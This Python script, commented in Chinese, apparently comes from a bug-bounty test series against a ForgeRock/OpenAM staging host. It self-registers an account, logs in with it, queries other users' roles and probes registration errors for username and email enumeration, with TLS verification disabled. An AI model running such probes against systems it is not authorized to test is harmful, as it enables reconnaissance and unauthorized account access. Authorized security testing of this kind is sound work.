# -*- coding: utf-8 -*-
"""AIC 第三十六轮:Registration 树提交(修正 input 字段名) + 新账户视角
修正上轮客户端 bug:callback input 的 name 必须用 output[0].name(字段名)。
流程:正确注册 -> 若成功:新账户登录/roles/权限对比 -> 重复用户名错误信息(枚举?)
预期结果表:
  成立 -> 注册直接成功(无邮件验证);重复用户名错误信息泄露存在性;新账户权限异常
  不成立 -> 注册被拒(策略/验证),错误信息无泄露
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                  'Accept-API-Version': 'resource=1.0, protocol=1.0',
                  'Content-Type': 'application/json'})

def start_tree():
    r = S.post(AUTH + '?authIndexType=service&authIndexValue=Registration', json={},
               timeout=15, verify=False)
    return r.json()

def build_submit(authId, cbs, username, mail, password='RegTest1644!x'):
    """按字段名正确构造 input"""
    inp_map = {}
    for cb in cbs:
        t = cb['type']
        out_names = [o.get('name') for o in cb.get('output', [])]
        if t == 'ValidatedCreateUsernameCallback':
            inp_map[id(cb)] = [{'name': 'username', 'value': username}]
        elif t == 'ValidatedCreatePasswordCallback':
            inp_map[id(cb)] = [{'name': 'password', 'value': password}]
        elif t == 'StringAttributeInputCallback':
            nm = out_names[0] if out_names else 'value'
            val = mail if nm == 'mail' else ('Reg' if nm == 'givenName' else 'Test')
            inp_map[id(cb)] = [{'name': nm, 'value': val}]
        elif t == 'BooleanAttributeInputCallback':
            nm = out_names[0] if out_names else 'value'
            inp_map[id(cb)] = [{'name': nm, 'value': True}]
        elif t == 'KbaCreateCallback':
            inp_map[id(cb)] = [{'name': 'question', 'value': "What's your favorite color?"},
                               {'name': 'answer', 'value': 'blue'}]
        elif t == 'TermsAndConditionsCallback':
            inp_map[id(cb)] = [{'name': 'accept', 'value': True}]
        else:
            inp_map[id(cb)] = [{'name': 'value', 'value': 'x'}]
    return {'authId': authId, 'callbacks': [
        {'type': cb['type'], 'output': cb.get('output', []),
         'input': inp_map[id(cb)], '_id': cb.get('_id')} for cb in cbs]}

def submit_reg(username, mail):
    d = start_tree()
    body = build_submit(d.get('authId'), d.get('callbacks', []), username, mail)
    r = S.post(AUTH + '?authIndexType=service&authIndexValue=Registration', json=body,
               timeout=15, verify=False)
    print('注册 [%s] -> %d %s' % (username, r.status_code, r.text[:300].replace('\n', ' ')))
    return r

print('--- 1. 正常注册 regtest1644 ---')
r = submit_reg('regtest1644', 'regtest1644@example.com')

print('\n--- 2. 注册后立即登录 ---')
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': 'regtest1644'}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': 'RegTest1644!x'}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
print('新账户登录 -> %d %s' % (r2.status_code, r2.text[:200].replace('\n', ' ')))
try:
    j = r2.json()
    tok2 = j.get('tokenId')
    print('tokenId:', (tok2 or 'NONE')[:30])
except Exception:
    tok2 = None

if tok2:
    S2 = requests.Session()
    S2.trust_env = False
    S2.proxies = {'http': None, 'https': None}
    S2.headers.update({'User-Agent': 'research-1643',
                       'Cookie': 'aa942d46ece12ce=' + tok2,
                       'Accept-API-Version': 'resource=2.1, protocol=1.0'})
    # 新账户 ID
    r = S2.get(BASE + '/am/json/realms/root/realms/alpha/users?_queryFilter=userName%20eq%20%22regtest1644%22&_fields=userName,_id,roles',
               timeout=12, verify=False)
    print('新账户查询 -> %d %s' % (r.status_code, r.text[:300].replace('\n', ' ')))
    r = S2.get(BASE + '/am/json/realms/root/realms/alpha/users?_queryFilter=userName%20eq%20%22pccp%22&_fields=userName,_id,roles',
               timeout=12, verify=False)
    print('pccp 对照查询 -> %d %s' % (r.status_code, r.text[:300].replace('\n', ' ')))

print('\n--- 3. 重复用户名/邮箱错误信息(枚举探测) ---')
submit_reg('pccp', 'regtest1645@example.com')          # 已存在用户名 + 新邮箱
submit_reg('regtest1645', 'regtest1644@example.com')   # 新用户名 + 已存在邮箱(若注册成功过)
